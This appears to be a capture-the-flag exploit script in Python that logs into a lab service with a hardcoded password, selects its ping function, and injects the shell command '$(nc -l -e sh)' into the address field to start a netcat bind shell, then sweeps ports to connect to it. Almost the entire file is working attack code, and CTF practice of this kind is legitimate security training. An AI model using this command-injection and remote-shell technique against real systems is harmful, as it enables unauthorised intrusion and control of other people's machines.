__author__ = 'clu'

import sys
import socket

sys.path.append('../../../tools')

import ctf

UPDATE_IP = '192.168.56.101'
UPDATE_PORT = 9090

HOST = '192.168.56.101'
PORT = 3030

PASSWORD = "Start Gratis"

def listen_for_conn(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()

    print('Got connection from %s' % addr)

    return conn

def main():
    s = ctf.connect(HOST, PORT)

    # Password prompt
    ctf.recv(s)
    ctf.send(s, PASSWORD + '\n')

    # Wait for a prompt
    while '>' not in ctf.recv(s):
        pass

    '''
    1: Display Memory Information
    2: Display CPU Information
    3: Display Disk Information
    4: Display Processes
    5: Display Log
    6: Erase Log
    7: Ping
    8: Who is online
    9: Update Firmware
    10: Quit
    '''

    ctf.send(s, '7\n')

    # Which addr
    ctf.recv(s)

    ctf.send(s, '$(nc -l -e sh)\n')

    for i in range(1000,65536):
        if i != 3030:
            ctf.shell(HOST,i, tries=1, verbose=False)

if __name__ == '__main__':
    main()
